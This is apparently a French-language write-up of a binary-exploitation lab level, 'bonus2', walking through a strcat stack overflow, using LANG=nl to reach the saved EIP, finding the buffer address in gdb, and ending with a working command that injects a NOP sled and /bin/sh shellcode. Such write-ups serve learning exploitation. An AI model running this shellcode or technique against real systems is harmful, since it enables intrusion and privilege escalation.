bonus2:
Ici, deux fonctions, main et greetuser. On ne voit pas de shell admin donc il va falloir run son propre shellcode.

On remarque que deux arguments sont demandés. Ils sont strncpy dans un buffer, 40 pour le premier, 32 pour le deuxième, dans un buffer de 72 donc pas d'overflow possible ici. Par contre, plus loin ce même buffer est strcat a un autre buffer qui fait seulement 64. La faille se situe ici.

Si on essaie de remplir au max notre buffer de 72, on voit qu'on n'arrive pas à override EIP.

```
gdb bonus2
r $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? () // aucun match ici
```

On peut cependant changer la variable d'environnement LANG (export LANG) pour avoir une salutation plus longue ("Goedemiddag! " vs "Hello " c'est 14 au lieu de 7). 

```
(gdb) r $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? () // = 23eme position
```

Effectivement, donc si LANG= nl, offset est a 23

Il reste juste à injecter notre shellcode avec un nopsled, et faire pointer EIP quelque part après l'addresse de notre buffer[72].

Pour trouver l'adresse du buffer on met un breakpoint juste après strncpy, on run avec plein de NOP et on remonte $esp jusqu'à voir plein de 90:

```
disass main
[...]
0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    0xc(%ebp),%eax
   0x0804857f <+86>:    add    $0x8,%eax
   0x08048582 <+89>:    mov    (%eax),%eax
   0x08048584 <+91>:    movl   $0x20,0x8(%esp)
   0x0804858c <+99>:    mov    %eax,0x4(%esp)
   0x08048590 <+103>:   lea    0x50(%esp),%eax
   0x08048594 <+107>:   add    $0x28,%eax
   0x08048597 <+110>:   mov    %eax,(%esp)
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
   =>0x0804859f <+118>:   movl   $0x8048738,(%esp)
[...]
b *0x0804859f 
r $(python -c 'print "\x90" * 100) $(python -c 'print "\x90" * 100)
x/120x $esp
0xbffff640:     0xbffff6b8      0xbffff8f5      0x00000020      0xb7fff918
0xbffff650:     0x00000000      0x00000000      0x00000000      0xb7fd0ff4
0xbffff660:     0xbffff6ae      0xbffff6af      0x00000001      0xb7ec3c49
0xbffff670:     0xbffff6af      0xbffff6ae      0x00000000      0xb7ff3fec
0xbffff680:     0xbffff734      0x00000000      0x00000000      0xb7e5ec73
=> 0xbffff690:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff6a0:     0x90909090      0x90909090      0x90909090      0x90909090
```

0xbffff690 + 16 = 0xbffff6a0
on peut essayer de faire pointer EIP sur \xa0\xf6\xff\xbf

Notre shellcode fait 28 caractères, et on veut une nopesled la plus grande possible donc on va le séparer en deux pour avoir 23 caractères dans la 2ème string (afin d'atteindre EIP).


./bonus2 $(python -c 'print "\x90" * 35 + "\x31\xc0\x50\x68\x2f"') $(python -c 'print "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xaa\xf6\xff\xbf"')

Ca marche dans gdb mais pas en vrai parce qu'il y a des décalages d'adresse, on essaie en augmentant et en baissant et au final ça marche si on utilise 0xbffff680 and below (marche avec 62 par exemple)

La commande finale est
`./bonus2 $(python -c 'print "\x90" * 35 + "\x31\xc0\x50\x68\x2f"') $(python -c 'print "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x80\xf6\xff\xbf"')`